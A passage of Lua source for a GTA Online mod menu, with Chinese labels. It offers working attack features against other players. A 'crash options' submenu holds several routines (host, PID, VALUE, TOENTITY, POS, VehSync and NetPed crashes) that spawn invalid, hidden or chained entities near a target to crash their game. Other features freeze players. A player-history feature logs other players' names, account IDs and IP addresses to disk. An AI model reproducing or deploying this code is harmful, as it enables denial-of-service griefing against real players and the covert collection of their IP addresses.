		if network.get_player_player_is_spectating(player.player_id()) == pid or utilities.get_distance_between(player.get_player_ped(player.player_id()), player.get_player_ped(pid)) < 100 then
			utilities.request_model(gameplay.get_hash_key("sentinel"))
			local vehicle_ = vehicle.create_vehicle(gameplay.get_hash_key("sentinel"), utilities.offset_coords(player.get_player_coords(pid), player.get_player_heading(pid), 5, 1), player.get_player_coords(pid).z, true, false)
			network.request_control_of_entity(vehicle_)
			vehicle.set_vehicle_mod_kit_type(vehicle_, 0)
			vehicle.set_vehicle_mod(vehicle_, 48, 0, false)
			system.wait(5000)
			utilities.request_control(vehicle_)
			entity_func.hard_remove_entity(vehicle_)
			menu.notify("Done", Meteor)
		else
			menu.notify("您必须观察目标或靠近目标才能使用此功能.", Meteor, 5, 211)
		end
	else
		menu.notify("无效玩家.", Meteor, 3, 211)
	end
end)

a.astoman = menu.add_feature("超能力", "parent",a.yule.id, function(f)
end)

menu.add_feature("跟踪导弹", "toggle", a.yule.id, function(f)
	if f.on then
		utilities.request_model(3612858749)
		utilities.request_model(1262355818)
		guided_missile_object = object.create_object(1262355818, player.get_player_coords(player.player_id()) + v3(0, 0, 20), true, true)
		guided_missile_object_vehicle = vehicle.create_vehicle(3612858749, player.get_player_coords(player.player_id()) + v3(0, 0, 20), player.get_player_heading(player.player_id()), true, false)
		utilities.request_control_silent(guided_missile_object_vehicle)
		utilities.request_control_silent(guided_missile_object)
		entity.apply_force_to_entity(guided_missile_object, 3, 0, 0, 0, 0.0, 0.0, 0.0, false, true)
		utilities.request_control_silent(guided_missile_object_vehicle)
		utilities.request_control_silent(guided_missile_object)
		guided_missile_cam = natives.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", entity.get_entity_coords(guided_missile_object_vehicle).x, entity.get_entity_coords(guided_missile_object_vehicle).y, entity.get_entity_coords(guided_missile_object_vehicle).z, entity.get_entity_rotation(guided_missile_object_vehicle).x, entity.get_entity_rotation(guided_missile_object_vehicle).y, entity.get_entity_rotation(guided_missile_object_vehicle).z, 70.0, false, false):__tointeger64()
		natives.SET_CAM_ACTIVE(guided_missile_cam, true)
		natives.RENDER_SCRIPT_CAMS(true, true, 1000, true, true, 0)
		natives.ATTACH_CAM_TO_ENTITY(guided_missile_cam, guided_missile_object_vehicle, 0.0, 0.0, 1.0, false)
		if network.has_control_of_entity(guided_missile_object) and network.has_control_of_entity(guided_missile_object_vehicle) then
			while f.on do
				system.yield(0)
				natives.SET_CAM_ROT(guided_missile_cam, entity.get_entity_rotation(guided_missile_object_vehicle).x, entity.get_entity_rotation(guided_missile_object_vehicle).y, entity.get_entity_rotation(guided_missile_object_vehicle).z, 2)
				natives.REQUEST_ADDITIONAL_COLLISION_AT_COORD(entity.get_entity_coords(guided_missile_object_vehicle).x, entity.get_entity_coords(guided_missile_object_vehicle).y, entity.get_entity_coords(guided_missile_object_vehicle).z)
				entity.set_entity_visible(guided_missile_object_vehicle, false)
				entity.set_entity_god_mode(guided_missile_object_vehicle, true)
				entity.set_entity_collision(guided_missile_object_vehicle, false, false, false)
				entity.set_entity_rotation(guided_missile_object, cam.get_gameplay_cam_rot() + v3(180, 0, 0))
				entity.set_entity_rotation(guided_missile_object_vehicle, cam.get_gameplay_cam_rot())
				vehicle.set_vehicle_forward_speed(guided_missile_object_vehicle, 100)
				entity.set_entity_coords_no_offset(guided_missile_object, entity.get_entity_coords(guided_missile_object_vehicle))
				local success, float = gameplay.get_ground_z(player.get_player_coords(player.player_id()))
				if guided_missile_object and guided_missile_object_vehicle and entity.get_entity_entity_has_collided_with(guided_missile_object) ~= guided_missile_object_vehicle and (entity.has_entity_collided_with_anything(guided_missile_object) or (success and utilities.get_distance_between(player.get_player_coords(player.player_id()), v3(player.get_player_coords(player.player_id()).x, player.get_player_coords(player.player_id()).y, float)) < 0.5)) or not f.on then
					fire.add_explosion(entity.get_entity_coords(guided_missile_object), 8, true, false, 0.3, player.get_player_ped(player.player_id()))
					fire.add_explosion(entity.get_entity_coords(guided_missile_object), 60, true, false, 0.3, player.get_player_ped(player.player_id()))
					if guided_missile_object then
						utilities.hard_remove_entity(guided_missile_object)
						guided_missile_object = nil
					end
					if guided_missile_object_vehicle then
						utilities.hard_remove_entity(guided_missile_object_vehicle)
						guided_missile_object_vehicle = nil
					end
					if guided_missile_cam then
						natives.DESTROY_CAM(guided_missile_cam, false)
						natives.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
					end
					f.on = false
				end
				if guided_missile_object and guided_missile_object_vehicle and entity.is_entity_in_water(guided_missile_object) then
					fire.add_explosion(entity.get_entity_coords(guided_missile_object), 52, true, false, 0.3, player.get_player_ped(player.player_id()))
					if guided_missile_object then
						utilities.hard_remove_entity(guided_missile_object)
						guided_missile_object = nil
					end
					if guided_missile_object_vehicle then
						utilities.hard_remove_entity(guided_missile_object_vehicle)
						guided_missile_object_vehicle = nil
					end
					if guided_missile_cam then
						natives.DESTROY_CAM(guided_missile_cam, false)
						natives.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
					end
					f.on = false
				end
				scope_scaleform = graphics.request_scaleform_movie("REMOTE_SNIPER_HUD")
                graphics.begin_scaleform_movie_method(scope_scaleform, "REMOTE_SNIPER_HUD")
                 graphics.draw_scaleform_movie_fullscreen(scope_scaleform, 255, 255, 255, 255, 4)
                  graphics.end_scaleform_movie_method(scope_scaleform)
                                  graphics.begin_scaleform_movie_method(script_execute_scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")

				launch_guided_missile_scaleform = graphics.request_scaleform_movie("SUBMARINE_MISSILES")
				graphics.begin_scaleform_movie_method(launch_guided_missile_scaleform, "GENERIC_2")
				graphics.draw_scaleform_movie_fullscreen(launch_guided_missile_scaleform, 255, 255, 255, 255, 0)
				graphics.end_scaleform_movie_method(launch_guided_missile_scaleform)
				launch_guided_missile_scaleform_2 = graphics.request_scaleform_movie("DRONE_CAM")
				graphics.begin_scaleform_movie_method(launch_guided_missile_scaleform_2, "DRONE_CAM")
				graphics.draw_scaleform_movie_fullscreen(launch_guided_missile_scaleform_2, 255, 255, 255, 255, 0)
				graphics.end_scaleform_movie_method(launch_guided_missile_scaleform_2)
				if guided_missile_object then
					natives.LOCK_MINIMAP_POSITION(entity.get_entity_coords(guided_missile_object).x, entity.get_entity_coords(guided_missile_object).y)
				end
			end
		end
	end
	if not f.on then
		if guided_missile_object then
			utilities.hard_remove_entity(guided_missile_object)
			guided_missile_object = nil
		end
		if guided_missile_object_vehicle then
			utilities.hard_remove_entity(guided_missile_object_vehicle)
			guided_missile_object_vehicle = nil
		end
		if guided_missile_cam then
			natives.DESTROY_CAM(guided_missile_cam, false)
			natives.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
		end
		if launch_guided_missile_scaleform then
			graphics.set_scaleform_movie_as_no_longer_needed(launch_guided_missile_scaleform)
		end
		if launch_guided_missile_scaleform_2 then
			graphics.set_scaleform_movie_as_no_longer_needed(launch_guided_missile_scaleform_2)
		end
		guided_missile_object = nil
		natives.UNLOCK_MINIMAP_POSITION()
	end
end)

menu.add_feature("历史玩家", "action_value_str", a.hisplayer.id, function(f)
	if f.value == 0 then
		local input, status = essentials.get_input("请输入玩家信息(RID/名称/IP)", "", 128, 0)
		if status == 2 then
			return
		end
		input = input:lower()
		local str = essentials.get_file_string("scripts\\Candy\\players.log", "*a")
		if toggle["Sort player history search from newest to oldest"].on then
			str = str:reverse()
			input = input:reverse()
		end
		for line in str:gmatch("([^\n]*)\n?") do
			if line:lower():find(input, 1, true) then
				if toggle["Sort player history search from newest to oldest"].on then
					line = line:reverse()
				end
				local name = line:match("|(.-)|") or "" 
				local rid = line:match(" &(.-)&") or ""
				local ip = line:match("%^(.-)%^") or ""
				local time = line:match("!(.-)!") or ""
				player_history.searched_players[#player_history.searched_players + 1] = menu.add_feature(name.." ["..time.."]", "parent", a.hisplayer.id, function(f)
					player_history.add_features(f, rid, ip, name)	
				end)
				return
			end
		end
		essentials.msg("查询不到玩家信息", 6, true)
	elseif f.value == 1 then
		for i, parent in pairs(player_history.searched_players) do
			parent.hidden = true
		end
		player_history.searched_players = {}
	end
end):set_str_data({
	"查询",
	"清空查询列表"	
})

for year_index, year in pairs(essentials.sort_numbers(utils.get_all_sub_directories_in_directory(o.lib_path.."History_Players"))) do
	player_history.year_parents[year] = menu.add_feature(year, "parent", a.hisplayer.id)
	for month_index, month in pairs(essentials.sort_numbers(utils.get_all_sub_directories_in_directory(o.lib_path.."History_Players\\"..year))) do
		if player_history.count == 2 then
			break
		end
		player_history.month_parents[year..month] = menu.add_feature(string.gsub(month:gsub("_", " "), "%d", ""), "parent", player_history.year_parents[year].id)
		for day_index, day in pairs(essentials.sort_numbers(utils.get_all_sub_directories_in_directory(o.lib_path.."History_Players\\"..year.."\\"..month))) do
			if player_history.count == 2 then
				break
			end
			player_history.day_parents[year..month..day] = menu.add_feature(day, "parent", player_history.month_parents[year..month].id)
			player_history.count = player_history.count + 1
			for file_index, current_file in pairs(essentials.sort_numbers(utils.get_all_files_in_directory(o.lib_path.."History_Players\\"..year.."\\"..month.."\\"..day, "log"))) do
				player_history.hour_parents[year..month..day..current_file:gsub("%.log$", "")] = menu.add_feature(current_file:gsub("%.log$", ""), "parent", player_history.day_parents[year..month..day].id)
				for player_info in essentials.get_file_string("scripts\\lib\\History_Players\\"..year.."\\"..month.."\\"..day.."\\"..current_file, "*a"):gmatch("([^\n]*)\n?") do
					local name = player_info:match("|(.+)|") or "" 
					local rid = player_info:match(" &(.+)&") or ""
					local ip = player_info:match("%^(.+)%^") or ""
					local time = player_info:match("!(.+)!") or ""
					menu.add_feature(name.." ["..time.."]", "parent", player_history.hour_parents[year..month..day..current_file:gsub("%.log$", "")].id, function(f)
						player_history.add_features(f, rid, ip, name)	
					end)
					player_history.players_added_to_history[rid] = true
				end
			end
		end
	end
end

toggle["History_Players"] = menu.add_feature("历史玩家", "toggle", a.hisplayer.id, function(f)
	while f.on do
	Settings["hisplayer"] = true
		system.yield(0)
		for pid = 0, 31 do
			system.yield(0)
			if not player_history.players_added_to_history[player.get_player_scid(pid)] and f.on and pid ~= player.player_id() and player.is_player_valid(pid) then
				local month, day, year, time, date = player_history.get_date()
				if not utils.dir_exists(o.lib_path.."History_Players\\"..year) then
					utils.make_dir(o.lib_path.."History_Players\\"..year)
				end
				if not player_history.year_parents[year] then
					player_history.year_parents[year] = menu.add_feature(year, "parent", 0)
				end
				if not utils.dir_exists(o.lib_path.."History_Players\\"..year.."\\"..month) then
					utils.make_dir(o.lib_path.."History_Players\\"..year.."\\"..month)
				end
				if not player_history.month_parents[year..month] then
					player_history.month_parents[year..month] = menu.add_feature(string.gsub(month:gsub("_", " "), "%d", ""), "parent", player_history.year_parents[year].id)
				end

				if not utils.dir_exists(o.lib_path.."History_Players\\"..year.."\\"..month.."\\"..day) then
					utils.make_dir(o.lib_path.."History_Players\\"..year.."\\"..month.."\\"..day)
				end
				if not player_history.day_parents[year..month..day] then
					player_history.day_parents[year..month..day] = menu.add_feature(day, "parent", player_history.month_parents[year..month].id)
				end

				if not utils.file_exists(o.lib_path.."History_Players\\"..year.."\\"..month.."\\"..day.."\\"..time..".log") then
					local file = io.open(o.lib_path.."History_Players\\"..year.."\\"..month.."\\"..day.."\\"..time..".log", "w+")
					essentials.file(file, "close")
				end
				if not player_history.hour_parents[year..month..day..time] then
					player_history.hour_parents[year..month..day..time] = menu.add_feature(time, "parent", player_history.day_parents[year..month..day].id)
				end
				local name, rid, ip = player.get_player_name(pid), player.get_player_scid(pid), essentials.get_ip_in_ipv4(pid)
				local player_info = name.." ["..os.date("%X").."]"
				local info_to_log = "|"..name.."| &"..rid.."& ^"..ip.."^".." !"..os.date("%X").."!".." <"..date..">"
				local path = "scripts\\Candy\\History_Players\\"..year.."\\"..month.."\\"..day
				for hour_index, hour in pairs(essentials.sort_numbers(utils.get_all_files_in_directory(o.home..path, "log"))) do
					if essentials.search_for_match_and_get_line(path.."\\"..hour, {"&"..rid.."&"}, false, true) then
						player_history.players_added_to_history[rid] = true
						break
					end
				end
				if not player_history.players_added_to_history[rid] then
					essentials.log(select(1, (o.lib_path.."History_Players\\"..year.."\\"..month.."\\"..day.."\\"..time..".log"):gsub(essentials.remove_special(o.home), "")), info_to_log)
					menu.add_feature(player_info, "parent", player_history.hour_parents[year..month..day..time].id, function(f)
						if f.child_count == 0 then
							player_history.add_features(f, rid, ip, name)
						end
					end)
					essentials.log("scripts\\Candy\\players.log", info_to_log)
					player_history.players_added_to_history[rid] = true
				end
			end
		end
	end
	Settings["hisplayer"] = false
end)
toggle["History_Players"].on = Settings["hisplayer"]

toggle["Sort player history search from newest to oldest"] = menu.add_feature("从最新排序搜索", "toggle", a.hisplayer.id)
toggle["Sort player history search from newest to oldest"].on = Settings["New_History"]

for pid = 0, 31 do
local features = {} 
playerlist[pid] = menu.add_feature("Player " .. pid, "parent", a.onlineplayer.id, function()
end)

frozen = menu.add_feature("冻结","toggle",playerlist[pid].id,function(feat)
	while feat.on do
		local pedp = player.get_player_ped(pid)
		ped.clear_ped_tasks_immediately(pedp)
		return HANDLER_CONTINUE
	end
	feat.on = false
end)

crashmenu = menu.add_feature("崩溃选项", "parent", playerlist[pid].id,function(feat)
end)

heiping11 = menu.add_feature("11","toggle",crashmenu.id,function(f)
    if f.on then
        ui.draw_rect(.5, .5, 1, 1, 0, 0, 0, 255)
        ui.set_text_scale(2.0)
        ui.set_text_font(7)
        ui.set_text_centre(0)
        rainbowr = rainbowr + math.random(0, 3)
        rainbowg = rainbowg + math.random(0, 3)
        rainbowb = rainbowb + math.random(0, 3)
        if rainbowr > 255 then
            rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
            rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
            rainbowb = rainbowb - 255
        end
        ui.set_text_color(rainbowr, rainbowg, rainbowb, 255)
        ui.set_text_outline(true)
        ui.draw_text("正在崩溃主机玩家", v2(0.5, 0.45))
    end
    return HANDLER_CONTINUE
end)
heiping11.hidden = true

menu.add_feature("崩溃主机","action",crashmenu.id,function(f)
    heiping11.on = true
    system.wait(100)
    myped = player.get_player_ped(player.player_id())
    mypos = player.get_player_coords(player.player_id())
    entity.set_entity_coords_no_offset(myped,v3(2458,-8475,60))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(-6170,10837,40))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(0,0,40))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(-6170,10837,40))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(2458,-8475,60))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(-6170,10837,40))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(0,0,40))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(-6170,10837,40))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(2458,-8475,60))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(-6170,10837,40))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(0,0,40))
    system.wait(600)
    entity.set_entity_coords_no_offset(myped,v3(-6170,10837,40))
    system.wait(600)

    entity.set_entity_coords_no_offset(myped,mypos)
    system.wait(300)
    heiping11.on = false
end)

setting_crash[pid] = menu.add_feature("设置下列崩溃强度","action_value_str",crashmenu.id, function(feat)
		if feat.value == 0 then
			crash_strength = 0
			crash_strengtc = 60
			for i = 0,31 do
				setting_crash[i].value = crash_strength
			end
			notify_above_map("已设置强度为低")
		elseif  feat.value == 1  then
			crash_strength = 1
			crash_strengtc = 90
			for i = 0,31 do
				setting_crash[i].value = crash_strength
			end
			notify_above_map("已设置强度为中")
		elseif  feat.value == 2  then
			crash_strength = 2
			crash_strengtc = 120
			for i = 0,31 do
				setting_crash[i].value = crash_strength
			end
			notify_above_map("已设置强度为高")
		end
	end)

setting_crash[pid]:set_str_data({"低","中","高"})
setting_crash[pid].value = crash_strength
	
entity_crash_p = menu.add_feature("PID崩溃","action_value_str",crashmenu.id, function(feat)
		if CD == 0 then
			CD = 1
			if feat.value == 0 then
				for i = 0 , crash_strengtc do
					local ppos = player.get_player_coords(pid)
					local headpid = player.get_player_heading(pid)
					local headpid = math.rad((headpid - 180) * -1)
					ppos.x = ppos.x + math.sin(headpid) * -3
					ppos.y = ppos.y + math.cos(headpid) * -3
					invalidpeda[i] = Cped(i,0x92991B72,ppos , 0)
					entity.set_entity_god_mode(invalidpeda[i], true)
					system.wait(1)
				end	
			elseif  feat.value == 1  then
				for i = 0 , crash_strengtc do
					local ppos = player.get_player_coords(pid)
					local headpid = player.get_player_heading(pid)
					local headpid = math.rad((headpid - 180) * -1)
					ppos.x = ppos.x + math.sin(headpid) * -3
					ppos.y = ppos.y + math.cos(headpid) * -3
					invalidpeda[i] = Cped(i,0x9B22DBAF,ppos , 0)
					entity.set_entity_god_mode(invalidpeda[i], true)
					system.wait(1)
				end	
			elseif  feat.value == 2  then
				for i = 0 , crash_strengtc do
					local ppos = player.get_player_coords(pid)
					local headpid = player.get_player_heading(pid)
					local headpid = math.rad((headpid - 180) * -1)
					ppos.x = ppos.x + math.sin(headpid) * -3
					ppos.y = ppos.y + math.cos(headpid) * -3
					invalidpeda[i] = Cped(i,0x92991B72,ppos , 0)
					invalidpeda[i] = Cped(i,0x9B22DBAF,ppos , 0)
					entity.set_entity_god_mode(invalidpeda[i], true)
					system.wait(1)
				end	
			end
			notify_above_map("崩溃已发送")
			system.wait(40000)
			allpeds = ped.get_all_peds()
			for i = 1, #allpeds  do
				pedhash = entity.get_entity_model_hash(allpeds[i])
				if pedhash == 0x9B22DBAF or pedhash == 0x92991B72 then
					entity.delete_entity(allpeds[i])
				end
			end
			CD = 0
			notify_above_map("冷却完成")
		else
			notify_above_map("冷却中")
		end
	end)
entity_crash_p:set_str_data({"P1","P2","P3"})
	
entity_crash_c = menu.add_feature("VALUE崩溃","action_value_str",crashmenu.id, function(feat)
		if CD == 0 then
			CD = 1
			if feat.value == 0 then
				for i = 0 , crash_strengtc do
					local upos = player.get_player_coords(pid)
					invalidpeda[i] = spawn_vehicle(3602674979,upos,0)
					entity.freeze_entity(invalidpeda[i],true)
					entity.set_entity_visible(invalidpeda[i],false)
					system.wait(1)
				end	
			elseif  feat.value == 1  then
				for i = 0 , crash_strengtc do
					local upos = player.get_player_coords(pid)
					invalidpeda[i] = spawn_vehicle(-42959138,upos,0)
					entity.freeze_entity(invalidpeda[i],true)
					entity.set_entity_visible(invalidpeda[i],false)
					system.wait(1)
				end	
			elseif  feat.value == 2  then
				for i = 0 , crash_strengtc do
					local upos = player.get_player_coords(pid)
					invalidpeda[i] = spawn_vehicle(3602674979,upos,0)
					invalidpeda[i] = spawn_vehicle(-42959138,upos,0)
					entity.freeze_entity(invalidpeda[i],true)
					entity.set_entity_visible(invalidpeda[i],false)
					system.wait(1)
				end	
			end
			notify_above_map("崩溃已发送")
			system.wait(40000)
			allpeds = vehicle.get_all_vehicles()
			for i = 1, #allpeds  do
				pedhash = entity.get_entity_model_hash(allpeds[i])
				if pedhash == 3602674979 or pedhash == -42959138 then
					entity.delete_entity(allpeds[i])
				end
			end
			CD = 0
			notify_above_map("冷却完成")
		else
			notify_above_map("冷却中")
		end
	end)
entity_crash_c:set_str_data({"C1","C2","C3"})

entity_crash_v = menu.add_feature("TOENTITY崩溃","action_value_str",crashmenu.id, function(feat)
		if CD == 0 then
			CD = 1	
			if feat.value == 0 then
				local pos = player.get_player_coords(pid)
				car = spawn_vehicle(0x9cf21e0f,pos,0)
				for i = 1, crash_strengtc do
					local pos = player.get_player_coords(pid)
					local ret = crash_strengtc % #V_hash_V == 0 and #V_hash_V or crash_strengtc % #V_hash_V
					invalidpeda[i] = spawn_vehicle(V_hash_V[ret],pos,0)
					entity.set_entity_god_mode(invalidpeda[i],true)
					entity.set_entity_visible(invalidpeda[i],false)
					if i == 1 then
						entity.attach_entity_to_entity(invalidpeda[i], car, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
					else
						entity.attach_entity_to_entity(invalidpeda[i], invalidpeda[i-1], 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
					end
				end
			elseif  feat.value == 1  then
				local pos = player.get_player_coords(pid)
				car = spawn_vehicle(3602674979,pos,0)
				for i = 1, crash_strengtc do
					local pos = player.get_player_coords(pid)
					local ret = crash_strengtc % #V_hash_C == 0 and #V_hash_C or crash_strengtc % #V_hash_C
					invalidpeda[i] = spawn_vehicle(V_hash_C[ret],pos,0)
					entity.set_entity_god_mode(invalidpeda[i],true)
					entity.set_entity_visible(invalidpeda[i],false)
					if i == 1 then
						entity.attach_entity_to_entity(invalidpeda[i], car, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
					else
						entity.attach_entity_to_entity(invalidpeda[i], invalidpeda[i-1], 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
					end
				end
				notify_above_map("崩溃已发送")
				system.wait(40000)
				allpeds = vehicle.get_all_vehicles()
				for i = 1, #allpeds  do
					pedhash = entity.get_entity_model_hash(allpeds[i])
					if pedhash == 3602674979 or pedhash == -42959138 then
						entity.delete_entity(allpeds[i])
					end
				end
			elseif  feat.value == 2  then
				local pos = player.get_player_coords(pid)
				ped_np = Cped(0, 0x9B22DBAF,pos , 0)
				for i = 1, crash_strengtc do
					local pos = player.get_player_coords(pid)
					local ret = crash_strengtc % #V_hash_N == 0 and #V_hash_N or crash_strengtc % #V_hash_N
					invalidpeda[i] = Cped(i, V_hash_N[ret],pos , 0)
					entity.set_entity_god_mode(invalidpeda[i],true)
					if i == 1 then
						entity.attach_entity_to_entity(invalidpeda[i], ped_np, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
					else
						entity.attach_entity_to_entity(invalidpeda[i], invalidpeda[i-1], 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
					end
				end	
				notify_above_map("崩溃已发送")
				system.wait(40000)
				allpeds = ped.get_all_peds()
				for i = 1, #allpeds  do
					pedhash = entity.get_entity_model_hash(allpeds[i])
					if pedhash == 0x9B22DBAF or pedhash == 0x92991B72 then
						entity.delete_entity(allpeds[i])
					end
				end
			end
			
			CD = 0
			notify_above_map("冷却完成")
		else
			notify_above_map("冷却中")
		end
	end)
entity_crash_v:set_str_data({"V1","V2","V3"})

targver = menu.add_feature("POS崩溃","action",crashmenu.id, function()
local mypid = player.get_player_ped(player.player_id())
if not lll then
caca = taomocar1(1784254509,player.player_id(),mypid,1)
system.wait(300)
end
mypos = player.get_player_coords(player.player_id())
for i = 1, 30 do
pos = player.get_player_coords(pid)
pos.z = pos.z - 10
entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
system.wait(50)
end
entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), mypos)
end)

menu.add_feature("VehSync崩溃", "action", crashmenu.id, function()
	menu.notify("Crashing...", "Veh Sync Crash", 2, RGBAToInt(0, 255, 255, 255))
    if pid ~= player.player_id() then
        request_model(2633113103)
        request_model(3471458123)
        request_model(3852654278)
        request_model(630371791)
        request_model(3602674979)
        local randd = math.random(0, 4)
        local syncveh = {}
        local syncveh1 = {}
        local syncveh2 = {}
        local syncveh3 = {}
        local syncveh4 = {}
        local syncveh5 = {}
        local syncveh6 = {}
        local syncveh7 = {}
        local randomnum = math.random(5, 10)
        for i = 1, randomnum do
            local plypos = v3()
            plypos = player.get_player_coords(pid)
            local random1, random2, random3 = math.random(1, 2), math.random(1, 2), math.random(1, 2)
            plypos.x = plypos.x
            plypos.y = plypos.y
            plypos.z = plypos.z
            if random1 == 1 then
            plypos.x = plypos.x - math.random(4, 9)
            else
            plypos.x = plypos.x + math.random(4, 9)
            end
            if random2 == 1 then
            plypos.y = plypos.y - math.random(4, 9)
            else
            plypos.y = plypos.y + math.random(4, 9)
            end
            if random3 == 1 then
            plypos.z = plypos.z - math.random(3, 5)
            else
            plypos.z = plypos.z + math.random(3, 5)
            end
            syncveh[i] = vehicle.create_vehicle(2633113103, plypos, 0, true, false)
            entity.set_entity_god_mode(syncveh[i], true)
            entity.set_entity_visible(syncveh[i], false)
            syncveh1[i] = vehicle.create_vehicle(2633113103, plypos, 0, true, false)
            entity.set_entity_god_mode(syncveh1[i], true)
            if randd ~= 0 then
            if randd == 1 then
            entity.set_entity_visible(syncveh1[i], true)
            else
            entity.set_entity_visible(syncveh1[i], false)
            end
            end
            syncveh2[i] = vehicle.create_vehicle(3471458123, plypos, 0, true, false)
            entity.set_entity_god_mode(syncveh2[i], true)
            entity.set_entity_visible(syncveh2[i], false)
            syncveh3[i] = vehicle.create_vehicle(3471458123, plypos, 0, true, false)
            entity.set_entity_god_mode(syncveh3[i], true)
            if randd ~= 0 then
            if randd == 2 then
            entity.set_entity_visible(syncveh3[i], true)
            else
            entity.set_entity_visible(syncveh3[i], false)
            end
            end
            syncveh5[i] = vehicle.create_vehicle(630371791, plypos, 0, true, false)
            entity.set_entity_god_mode(syncveh5[i], true)
            entity.set_entity_visible(syncveh5[i], false)
            syncveh6[i] = vehicle.create_vehicle(630371791, plypos, 0, true, false)
            entity.set_entity_god_mode(syncveh6[i], true)
            if randd ~= 0 then
            if randd == 3 then
            entity.set_entity_visible(syncveh6[i], true)
            else
            entity.set_entity_visible(syncveh6[i], false)
            end
            end
            syncveh7[i] = vehicle.create_vehicle(3602674979, plypos, 0, true, false)
            entity.set_entity_god_mode(syncveh7[i], true)
            if randd ~= 0 then
            if randd == 4 then
            entity.set_entity_visible(syncveh7[i], true)
            else
            entity.set_entity_visible(syncveh7[i], false)
            end
            end
            syncveh4[i] = vehicle.create_vehicle(3852654278, plypos, 0, true, false)
            entity.set_entity_god_mode(syncveh4[i], true)
            if randd ~= 0 then
            entity.set_entity_visible(syncveh4[i], false)
            end
            entity.attach_entity_to_entity(syncveh7[i], syncveh4[i], 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
            entity.attach_entity_to_entity(syncveh6[i], syncveh4[i], 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
            entity.attach_entity_to_entity(syncveh5[i], syncveh4[i], 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
            entity.attach_entity_to_entity(syncveh2[i], syncveh4[i], 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
            entity.attach_entity_to_entity(syncveh3[i], syncveh4[i], 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
            entity.attach_entity_to_entity(syncveh[i], syncveh4[i], 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
            entity.attach_entity_to_entity(syncveh1[i], syncveh4[i], 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
            local pped = player.get_player_ped(pid)
            entity.attach_entity_to_entity(syncveh4[i], pped, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, true)
            system.wait(10)
        end
        system.wait(2000)
        for i = 1, randomnum do
            entity.delete_entity(syncveh[i])
            entity.delete_entity(syncveh1[i])
            entity.delete_entity(syncveh2[i])
            entity.delete_entity(syncveh3[i])
            entity.delete_entity(syncveh4[i])
            entity.delete_entity(syncveh5[i])
            entity.delete_entity(syncveh6[i])
            entity.delete_entity(syncveh7[i])
            system.wait(1000)
        end
        menu.notify("Done", "Veh Sync Crash", 3, RGBAToInt(0, 255, 255, 255)) 
    end
end)

menu.add_feature("NetPed崩溃", "action", crashmenu.id, function()
	menu.notify("Crashing...", "Net Ped Crash", 2, RGBAToInt(0, 255, 255, 255))
            if pid ~= player.player_id() then
                request_model(225514697)
                local crapedd = {}
                local randmnuu = math.random(12, 22)
                local nummm = {8, 9}
                ppos = player.get_player_coords(pid)
                pedp = player.get_player_ped(pid)
                pedmy = player.get_player_ped(player.player_id())
                mypos = player.get_player_coords(player.player_id())
                ZPOS = ppos.z
                if ppos.z == -50.0 or ppos.z == -180.0 or ppos.z == -0.0 then 
                local L_time = 0
                while true do
                entity.set_entity_coords_no_offset(pedmy,ppos)
                system.wait(50)
                local playerpos_no = player.get_player_coords(pid)
                if playerpos_no.z ~= -50.0 then
                ZPOS = playerpos_no.z
                entity.set_entity_coords_no_offset(pedmy,mypos)
                break
                end
                L_time = L_time + 1
                if L_time > 100 then
                ui.notify_above_map("目标坐标异常稍后再试", "", 140)
                pedmy = player.get_player_ped(player.player_id())
                entity.set_entity_coords_no_offset(pedmy,mypos)
                return
                        end
                    end
                end
                system.wait(200)
                for i = 1, randmnuu do
                local ppos = v3()
                ppos = player.get_player_coords(pid)
                local randomn1, randomn2, randomn3, randomn4 =
                math.random(1, 2),
                math.random(1, 2),
                math.random(1, 2),
                math.random(1, 2)
                ppos.x = ppos.x
                ppos.y = ppos.y
                ppos.z = ZPOS
                if randomn1 == 1 then
                ppos.x = ppos.x - math.random(5, 9)
                else
                ppos.x = ppos.x + math.random(5, 9)
                end
                if randomn2 == 1 then
                ppos.y = ppos.y - math.random(5, 9)
                else
                ppos.y = ppos.y + math.random(5, 9)
                end
                if randomn3 == 1 then
                ppos.z = ppos.z - math.random(1, 5)
                else
                ppos.z = ppos.z + math.random(1, 5)
                end
                if randomn4 == 1 then
                pedtypp = 0
                else
                pedtypp = 3
                end
                crapedd[i] = ped.create_ped(pedtypp,225514697, ppos, 0, true, false)
                entity.set_entity_visible(crapedd[i], false)
                system.wait(1)
                end
                for i = 1, randmnuu do
                entity.set_entity_visible(crapedd[i], true)
                ped.set_ped_component_variation(crapedd[i], 0, 0, nummm[math.random(1, 2)], 0 )
                system.wait(1)
                end
                system.wait(2000)
                for i = 1, randmnuu do
                entity.delete_entity(crapedd[i])
                system.wait(1000)
                end
